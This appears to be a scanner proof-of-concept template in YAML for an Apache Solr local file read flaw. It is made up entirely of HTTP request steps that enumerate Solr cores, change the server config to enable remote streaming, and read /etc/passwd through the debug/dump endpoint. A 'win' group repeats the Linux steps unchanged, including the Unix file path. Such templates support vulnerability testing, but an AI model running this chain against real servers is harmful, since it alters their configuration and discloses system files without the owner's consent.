name: poc-yaml-solr-lfi
groups:
  win:
    - method: GET
      path: /solr/admin/cores?indexInfo=false&wt=json
      headers:
        Content-Type: application/json
      follow_redirects: true
      expression: >
        response.status == 200 && response.body.bcontains(b'name') && 
        response.content_type.contains("json")
      search: '"name":"(?P<core>.+?)"'
    - method: POST
      path: '/solr/{{core}}/config'
      headers:
        Content-type: application/json
      body: >-
        {"set-property" :
        {"requestDispatcher.requestParsers.enableRemoteStreamingContent-Type":true}}
      follow_redirects: false
      expression: >
        response.status==200 && response.body.bcontains(b'This response format is
        experimental.  It is likely to change in the future')
    - method: GET
      path: >-
        /solr/{{core}}/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd
      headers:
        Content-Type: application/json
      follow_redirects: true
      expression: >
        response.status == 200 &&
        r'root:[x*]:0:0:root:/root'.bmatches(response.body)
  Linux:
    - method: GET
      path: /solr/admin/cores?indexInfo=false&wt=json
      headers:
        Content-Type: application/json
      follow_redirects: true
      expression: >
        response.status == 200 && response.body.bcontains(b'name') && 
        response.content_type.contains("json")
      search: '"name":"(?P<core>.+?)"'
    - method: POST
      path: '/solr/{{core}}/config'
      headers:
        Content-type: application/json
      body: >-
        {"set-property" :
        {"requestDispatcher.requestParsers.enableRemoteStreamingContent-Type":true}}
      follow_redirects: false
      expression: >
        response.status==200 && response.body.bcontains(b'This response format is
        experimental.  It is likely to change in the future')
    - method: GET
      path: >-
        /solr/{{core}}/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd
      headers:
        Content-Type: application/json
      follow_redirects: true
      expression: >
        response.status == 200 &&
        r'root:[x*]:0:0:root:/root'.bmatches(response.body)
